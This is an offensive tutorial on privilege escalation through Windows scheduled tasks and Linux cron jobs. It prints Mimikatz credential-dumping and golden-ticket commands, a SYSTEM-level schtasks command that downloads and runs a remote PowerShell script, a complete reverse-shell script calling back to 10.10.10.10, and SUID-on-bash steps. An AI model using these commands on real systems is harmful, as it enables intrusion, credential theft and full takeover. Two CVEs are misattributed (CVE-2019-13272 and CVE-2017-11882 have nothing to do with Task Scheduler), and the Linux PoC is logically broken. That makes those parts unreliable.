# Abusing Scheduled Tasks for Privilege Escalation

## 

### Overview

Scheduled tasks (or scheduled jobs) are a critical part of both Windows and Linux systems, allowing for automated task execution. These tasks are typically used for system maintenance, backups, and updates. However, when misconfigured, they can present significant security risks. Privilege escalation attacks that exploit scheduled tasks involve running malicious commands or scripts with higher privileges, often as an administrator or system-level user. This write-up will explore how attackers can abuse scheduled tasks in both Windows and Linux environments, provide a breakdown of key commands, and offer practical exploitation examples with corresponding proof-of-concept (PoC) scripts.

---

### Abusing Scheduled Tasks on **Windows**

1. **Mimikatz: Token Elevation and Credential Dumping**
Mimikatz is a popular post-exploitation tool used to extract credentials, elevate tokens, and create Golden Tickets. The following Mimikatz commands can be used to manipulate tokens and credentials to gain higher privileges:
    
    ```bash
    mimikatz # token::elevate
    ```
    
    - This command elevates the current token, allowing the attacker to perform operations as a more privileged user, typically SYSTEM.
    
    ```bash
    mimikatz # vault::cred /patch
    ```
    
    - This command targets the Windows Credential Vault, attempting to dump and patch credentials.
    
    ```bash
    mimikatz # lsadump::lsa /patch
    ```
    
    - Dumps LSA (Local Security Authority) secrets from the system, exposing account passwords and other sensitive information.
    
    ```bash
    mimikatz # kerberos::golden /user:Administrator /rc4:<Administrator NTLM(step 3)> /domain:<DOMAIN> /sid:<USER SID> /sids:<Administrator SIDS> /ticket:<OUTPUT TICKET PATH>
    ```
    
    - This generates a golden ticket for the specified user, allowing the attacker to impersonate the Administrator and gain full control over the domain.

---

1. **Powercat for Reverse Shell**
    
    ```bash
    powercat -l -v -p 443
    ```
    
    - Powercat is a PowerShell-based tool for creating reverse shells. By listening on port 443, an attacker can receive incoming connections from compromised machines running malicious scripts.

---

1. **Creating and Running a Scheduled Task in Windows**
    
    To execute a malicious script using Windows Task Scheduler, the following command creates a new scheduled task that will run with SYSTEM privileges.
    
    ```bash
    schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://10.10.10.10/reverse.ps1)'
    ```
    
    **Flags Explanation:**
    
    - `/S DOMAIN`: Specifies the domain controller or target machine.
    - `/SC Weekly`: Sets the task to run weekly.
    - `/RU "NT Authority\SYSTEM"`: Runs the task with SYSTEM privileges, which are the highest possible on Windows.
    - `/TN "enterprise"`: Specifies the task name.
    - `/TR "powershell.exe -c 'iex (iwr http://10.10.10.10/reverse.ps1)'"`: The task executes a PowerShell script downloaded from a remote server, which in this case could establish a reverse shell.
    
    Once the task is created, it can be manually triggered with:
    
    ```bash
    schtasks /run /s DOMAIN /TN "enterprise"
    ```
    
    This command forces the task to run immediately.
    

---

### Key Takeaways on Windows Scheduled Task Abuse

- **Misconfigurations**: If users are allowed to create or modify tasks with elevated privileges (e.g., SYSTEM), attackers can leverage scheduled tasks for persistent access or elevate their privileges.
- **Exploitable Commands**: The combination of `schtasks` and PowerShell can be used to run arbitrary commands or download malicious scripts from a remote server.

---

### Abusing Scheduled Tasks on **Linux**

1. **Setting the SUID Bit on /bin/bash**
The SUID (Set User ID) bit allows a program to execute with the privileges of the file owner (typically root), even if the user running it does not have those privileges. Setting the SUID bit on `/bin/bash` can allow an attacker to run a shell with root privileges.
    
    ```bash
    echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
    chmod +x /home/user/systemupdate.sh
    ```
    
    - `chmod +s /bin/bash`: This command sets the SUID bit on `/bin/bash`, allowing any user to execute it with root privileges.
    - `chmod +x /home/user/systemupdate.sh`: Makes the script executable.
    
    After waiting for the scheduled task to run, an attacker can escalate their privileges:
    
    ```bash
    /bin/bash -p
    id && whoam
    ```
    
    - `/bin/bash -p`: Executes `/bin/bash` with the `p` option, which prevents the shell from dropping privileges, granting root access.
    - `id && whoami`: Confirms that the user is now operating with root privileges.

---

1. **Cron Job Abuse (Example)**
    
    Another common vector is exploiting cron jobs, which are used to schedule periodic tasks. An attacker can gain root access if a cron job is misconfigured to run a script with weak permissions. For instance, an insecure cron job might look like this:
    
    ```bash
    0 0 * * * /bin/bash /home/user/insecure_script.sh
    ```
    
    If `insecure_script.sh` is writable by the attacker, they can inject malicious commands, such as:
    
    ```bash
    echo '/bin/bash -i' > /home/user/insecure_script.sh
    chmod +x /home/user/insecure_script.sh
    ```
    
    This will allow the attacker to spawn an interactive root shell when the cron job runs.
    

---

### Key Takeaways on Linux Scheduled Task Abuse

- **SUID Misuse**: Setting the SUID bit on critical binaries like `/bin/bash` can provide escalated privileges if the binary is executed by a non-privileged user.
- **Cron Jobs and Insecure Scripts**: Cron jobs that execute scripts with weak permissions can be leveraged to execute arbitrary commands or gain root access.

---

### In-Depth Explanation of Key Commands

### **Windows**

**PowerShell Reverse Shell (iex (iwr http://10.10.10.10/reverse.ps1)):**

- `iex`: The `Invoke-Expression` cmdlet allows execution of strings as PowerShell commands.
- `iwr`: The `Invoke-WebRequest` cmdlet downloads content from a URL (in this case, a reverse shell script).
- This command enables attackers to fetch and execute a malicious script remotely.

**Scheduled Task Creation (schtasks /create):**

- `/SC Weekly`: Defines how often the task will run. Other options include daily, monthly, etc.
- `/RU "NT Authority\SYSTEM"`: Specifies that the task runs as SYSTEM, which is the highest privilege on the machine.

---

### **Linux**

**Setting the SUID Bit (chmod +s /bin/bash):**

- The SUID bit allows the user to execute the binary with the permissions of the file owner, which in the case of `/bin/bash`, would be root. This is a critical vulnerability if improperly set on executables.

**Cron Job Example (0 0 * * * /bin/bash /home/user/insecure_script.sh):**

- This cron job runs at midnight every day, executing a script that could be tampered with by an attacker if it has insecure permissions.

---

### Proof-of-Concept (PoC) Scripts

### **Windows PoC Script**

```powershell
# PowerShell reverse shell script (reverse.ps1)
$ip = "10.10.10.10"
$port = 443
$tcpClient = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $tcpClient.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.WriteLine($env:COMPUTERNAME)
$writer.Flush()
while ($true) {
    $command = $reader.ReadLine()
    $output = Invoke-Expression -Command $command
    $writer.WriteLine($output)
    $writer.Flush()
}
```

### **Linux PoC Script**

```bash
#!/bin/bash
# This script sets SUID on bash and runs with root privileges
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh
/bin/bash -p
```

---

### Real-World Examples and Vulnerabilities

- **CVE-2019-13272**: A vulnerability in the Windows Task Scheduler where an attacker could exploit a misconfigured scheduled task to escalate privileges.
- **CVE-2017-11882**: Microsoft Office vulnerability that allows attackers to use scheduled tasks to exploit PowerShell scripts.

---

### Conclusion

Abusing scheduled tasks in both Windows and Linux systems is a powerful technique for privilege escalation. By exploiting misconfigurations or using specific commands, attackers can escalate their privileges to SYSTEM or root and execute arbitrary commands. Understanding these attack vectors is essential for penetration testers and system administrators alike to secure scheduled tasks and prevent unauthorized access.
